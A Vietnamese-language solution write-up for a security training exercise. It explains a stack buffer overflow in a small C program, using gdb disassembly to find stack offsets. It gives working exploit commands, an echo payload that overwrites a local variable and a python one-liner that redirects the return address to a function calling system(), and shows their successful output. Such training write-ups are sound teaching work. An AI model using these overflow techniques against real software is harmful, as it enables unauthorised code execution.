#Solution

> Người viết bài còn tuy thiếu kinh nghiệm nhưng đề cao tinh thần học hỏi. Mọi sai sót vui lòng bỏ qua 🙂 .
Pwn
> Trình bày cách giải của bạn ở level 02 & 03 trong ví dụ 2 của bài training. Người chiến thằng là người có bài viết giải thích rõ ràng nhất. Materials: https://github.com/lamminhbao/sectrain2018
##Level 2

Vì chúng ta có source code → nên ta biết hàm `f` thực hiện tạo biến `cookie` và xử lí chuỗi `s` nhập vào:

    void f(char* input) {
            int cookie = 0;
            char s[32];
            strcpy(s, input);
    
            if (cookie){
                    printf("Cookie changed - You win level 00.\n");
            }
            if (cookie == 0x41424344) {
                    printf("Cookie to 0x%x  - You win level 01.\n", cookie);
            }
            if (cookie == 0x01020304) {
                    printf("Cookie to 0x%x  - You win level 02.\n", cookie);
            }
            printf("%p\n", s);
    }

Biến `cookie` ban đầu được gán bằng `0`. Để win level 2 thì cần phải thay đổi giá trị của `cookie` thành các giá trị cho phù hợp.
Chương trình xài hàm `strcpy` cũ kỹ dễ bị lỗi buffer overflow. Như vậy có thể lợi dụng lỗi này của `strcpy` để tràn qua vùng nhớ của biến `cookie`.
Vấn đề là chúng ta không biết chương trình sẻ dụng compiler gì và như thế nào (mặc kệ dòng comment `// gcc -m32 -z execstack -fno-stack-protector ex02.c -o ex02`) nên không thể chắc chắn được các biến `s` và `cookie` được sắp xếp như thế nào trong stack. Vì vậy cần disasemble để kiểm tra:

1. Chạy `gdb` load file `ex02`
    gdb-peda$ file ex02
    Reading symbols from ex02...(no debugging symbols found)...done.
2. Vì xử lý chính là hàm `f` nên kiểm tra hàm này:
    ```gdb-peda$ disassemble f
    Dump of assembler code for function f:
       0x080484b4 <+0>:        push   ebp
       0x080484b5 <+1>:        mov    ebp,esp
       0x080484b7 <+3>:        sub    esp,0x38
       0x080484ba <+6>:        mov    DWORD PTR [ebp-0xc],0x0
       0x080484c1 <+13>:        sub    esp,0x8
       0x080484c4 <+16>:        push   DWORD PTR [ebp+0x8]
       0x080484c7 <+19>:        lea    eax,[ebp-0x2c]
       0x080484ca <+22>:        push   eax
       0x080484cb <+23>:        call   0x8048350 <strcpy@plt>
       0x080484d0 <+28>:        add    esp,0x10
       0x080484d3 <+31>:        cmp    DWORD PTR [ebp-0xc],0x0
       0x080484d7 <+35>:        je     0x80484e9 <f+53>
       0x080484d9 <+37>:        sub    esp,0xc
       0x080484dc <+40>:        push   0x80485f8
       0x080484e1 <+45>:        call   0x8048360 <puts@plt>
       0x080484e6 <+50>:        add    esp,0x10
       0x080484e9 <+53>:        cmp    DWORD PTR [ebp-0xc],0x41424344
       0x080484f0 <+60>:        jne    0x8048505 <f+81>
       0x080484f2 <+62>:        sub    esp,0x8
       0x080484f5 <+65>:        push   DWORD PTR [ebp-0xc]
       0x080484f8 <+68>:        push   0x804861c
       0x080484fd <+73>:        call   0x8048340 <printf@plt>
       0x08048502 <+78>:        add    esp,0x10
       0x08048505 <+81>:        cmp    DWORD PTR [ebp-0xc],0x1020304
       0x0804850c <+88>:        jne    0x8048521 <f+109>
       0x0804850e <+90>:        sub    esp,0x8
       0x08048511 <+93>:        push   DWORD PTR [ebp-0xc]
       0x08048514 <+96>:        push   0x8048644
       0x08048519 <+101>:        call   0x8048340 <printf@plt>
       0x0804851e <+106>:        add    esp,0x10
       0x08048521 <+109>:        sub    esp,0x8
       0x08048524 <+112>:        lea    eax,[ebp-0x2c]
       0x08048527 <+115>:        push   eax
       0x08048528 <+116>:        push   0x8048669
       0x0804852d <+121>:        call   0x8048340 <printf@plt>
       0x08048532 <+126>:        add    esp,0x10
       0x08048535 <+129>:        nop
       0x08048536 <+130>:        leave  
       0x08048537 <+131>:        ret    
    End of assembler dump.

Ở dòng 11 ta thấy có lệnh gọi hàm con `strcpy`:

    0x080484cb <+23>:        call   0x8048350 <strcpy@plt>

Trong file source ta thấy hàm `f` tạo biến `cookie` và mảng `s` trước khi gọi hàm `strcpy`. Ở đây ta đang quan tâm đến `cookie` và `s` nên trong đoạn asm trên là chỉ cần quan tâm đến 10 dòng đầu:

- `0x080484b4 <+0>:        push   ebp` đẩy `ebp` lên stack
- `0x080484b5 <+1>:        mov    ebp,esp` copy giá trị của `esp` vào `ebp`
- `0x080484b7 <+3>:        sub    esp,0x38` đầy stack xuống `0x38`=`56` ô nhớ (giả sử 1 ô nhớ = 1 byte) vì trong kiến trúc Intel x86 (chương trình được complile cho kiến trúc này) stack phát triển từ xuống → allocate vùng nhớ trên stack cho các biến local của hàm (`f`).

Vẫn chưa có gì đáng chú ý cho đến dòng:

- `0x080484ba <+6>:        mov    DWORD PTR [ebp-0xc],0x0` lưu số nguyên 4 bytes `0x0`=0 vào địa chỉ của `ebp-12` (`0xc`=`12`); dòng này  tương đương `int cookie = 0` trong chương trình nguồn.
- `0x080484c1 <+13>:        sub    esp,0x8` allocate 8 bytes vào đầu stack
- `0x080484c4 <+16>:        push   DWORD PTR [ebp+0x8]` đẩy 4 bytes bắt đầu từ `ebp+0x8` lên trên cùng của stack. Dòng này liên quan đến `char* input` trong source code.
- `0x080484c7 <+19>:        lea    eax,[ebp-0x2c]` lưu địa chỉ của `ebp-0x2c` vào `eax`, địa chỉ này chính là địa chỉ của mảng `s`.
- `0x080484ca <+22>:        push   eax` đưa eax lên đầu stack.

Từ đó ta có thể thấy vị trí của `s` là `ebp-44` (`0x2c`=`44`), còn `cookie`  có vị trí `ebp-12`. 2 địa chỉ này cách nhau `44-12`=`32` ô nhớ. Như vậy có thể tạm kết luận compiler đã sắp xếp `cookie` nằm trên `s` trong stack. Chương trình theo quy tắc little-endian (do compile trên x86) nên dự liệu sẽ được ghi ngược lại từ phải qua trái: với giá trị `0x01020304` thì máy sẽ lưu là `04 03 02 01`.
Như vậy, vần đề còn lại chỉ làm làm tràn bộ nhớ bằng cách nhập quá 32 ký tự và thay đổi giá trj biến `cookie` thành `0x01020304`. 
Tuy nhiên, thử đổi `0x01020304` sang ASCII, ta được:

- `01` = `SOH`
- `02` = `STX`
- `03` = `ETX`
- `04` = `EOT`

Đây là những ký tự không có trên bàn phím và không thể nhập trực tiếp. Tuy nhiên có cách để giải quyết vần đề này bằng cách sử dụng `echo` để truyền ký tự:

    ./ex02 `echo -e "AhihiAhihiAhihiAhihiAhihiAhihi:>\x04\x03\x02\x01"`

→ Kết quả thu được:

    root@bach-kali:~/Desktop/sectrain2018# ./ex02 `echo -e "AhihiAhihiAhihiAhihiAhihiAhihi:>\x04\x03\x02\x01"`
    Cookie changed - You win level 00.
    Cookie to 0x1020304  - You win level 02.
##Level 3

Ở thử thách này thì chúng ta cần phải thay đổi luồng thực thi để chương trình chạy hàm `abcxyz`.
Vì địa chỉ trở về nằm trên `ebp` nên cần overflow qua cả `ebp` và ghi đè lên ô địa chỉ trả về.
Câu hỏi đặt ra là ta cần bao nhiêu bytes để làm tràn qua `ebp`. Quan sát đoạn asm `0x080484c7 <+19>:        lea    eax,[ebp-0x2c]` ở trên ta có thể thấy địa chỉ của mảng `s` cách `ebp` 44 ô (`0x2c`). Bản thân `ebp` chiềm 4 bytes nên để tràn qua nó ta chỉ cần nhập đủ 48 bytes.
Bây giờ ta chỉ cần ghi đè địa chỉ bắt đầu của `abcxyz` lên địa chỉ trở về. Để biết được địa chỉ trở về nó ta chỉ cần disassemble `abcxyz`:
```gdb-peda$ disassemble abcxyz
Dump of assembler code for function abcxyz:
   0x0804849b <+0>:	push   ebp
   0x0804849c <+1>:	mov    ebp,esp
   0x0804849e <+3>:	sub    esp,0x8
   0x080484a1 <+6>:	sub    esp,0xc
   0x080484a4 <+9>:	push   0x8048600
   0x080484a9 <+14>:	call   0x8048360 <puts@plt>
   0x080484ae <+19>:	add    esp,0x10
   0x080484b1 <+22>:	sub    esp,0xc
   0x080484b4 <+25>:	push   0x8048612
   0x080484b9 <+30>:	call   0x8048370 <system@plt>
   0x080484be <+35>:	add    esp,0x10
   0x080484c1 <+38>:	nop
   0x080484c2 <+39>:	leave  
   0x080484c3 <+40>:	ret    
End of assembler dump.
```

Như vậy địa chỉ bắt đầu của `abcxyz` là `0x0804849b`. Chỉ cần ghi đè giá trị này lên giá trị trả về là qua được level 3:
```
./ex02 `python -c 'print("f"*48+"\x9b\x84\x04\x08")'`
Cookie changed - You win level 00.
0xffe1bd8c
You win level 03.
